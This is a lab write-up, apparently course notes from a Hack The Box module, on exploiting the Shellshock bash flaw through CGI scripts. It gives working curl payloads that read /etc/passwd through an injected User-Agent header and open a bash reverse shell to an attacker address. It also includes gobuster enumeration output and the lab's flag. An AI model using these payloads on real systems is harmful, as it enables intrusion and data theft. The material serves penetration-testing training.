# CGI - Shellshock

* CGI is middleware between web servers, external databases, and information sources.
* CGI scripts and programs are kept in the `/CGI-bin` directory
* often used for guest books, forms (email, feedback, registration), mailing lists, blogs, etc.
* can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.

CGI scripts/applications are typically used for a few reasons:

* If the webserver must dynamically interact with the user
* When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver

![image](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

### Shellshock via CGI

Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild

It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables.

Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly.

Typically when saving a function as a variable, the shell function will **stop** where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"bas
```

When the above variable is assign `y='() { :;};`  will be interpret as a function. when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable.

If the system is not vulnerable, only `"not vulnerable"` will be printed.

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```

### Example

**Enumeration - Gobuster**

```shell-session
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

/access.cgi           (Status: 200) [Size: 0]
```

cURL the script to see the output

```shell-session
curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

> No output

**Confirming the Vulnerability**

```shell-session
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

> if works the /etc/passwd will be printed

**Exploitation to Reverse Shell Access**

```shell-session
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

```shell-session
sudo nc -lvnp 7777
```

## Assessment

**Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.**

```
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.205.27/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/07/14 00:12:21 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
```

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<SNIP>
```

Is vulnerable to shell shock, then get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption><p>Sh3ll_Sh0cK_123</p></figcaption></figure>

